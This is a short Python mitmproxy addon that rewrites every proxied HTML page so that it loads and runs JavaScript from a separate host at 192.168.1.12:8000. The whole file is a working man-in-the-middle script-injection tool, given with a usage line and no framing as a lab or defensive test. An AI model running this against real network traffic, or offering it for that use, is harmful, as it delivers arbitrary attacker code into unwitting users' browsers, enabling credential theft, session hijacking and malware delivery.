# Usage: mitmdump -s "js_injector.py src"
# (this script works best with --anticache)
from bs4 import BeautifulSoup
from mitmproxy import ctx,http
import argparse

class Injector:
    def response(self, flow: http.HTTPFlow) -> None:
        html = BeautifulSoup(flow.response.content, "html.parser")
        if 'Content-Type' in flow.response.headers and 'text/html' in flow.response.headers['Content-Type']:
                print('test')
                #print(flow.response.headers['Content-type'])
                script = html.new_tag(
                    "script",
                    src='http://192.168.1.12:8000/script.js',
                    type='application/javascript')
                html.body.insert(0, script)
                flow.response.content = str(html).encode("utf8")
                print("\nScript injected.\n\n")
        else:
                print("\nWrong content type. Sorry.")
                #print(str(flow.response.headers['Content-Type']) + "\n\n")

#def start():
#    parser = argparse.ArgumentParser()
#    parser.add_argument("path", type=str)
#    args = parser.parse_args()
#    return Injector(args.path)

addons = [Injector()]
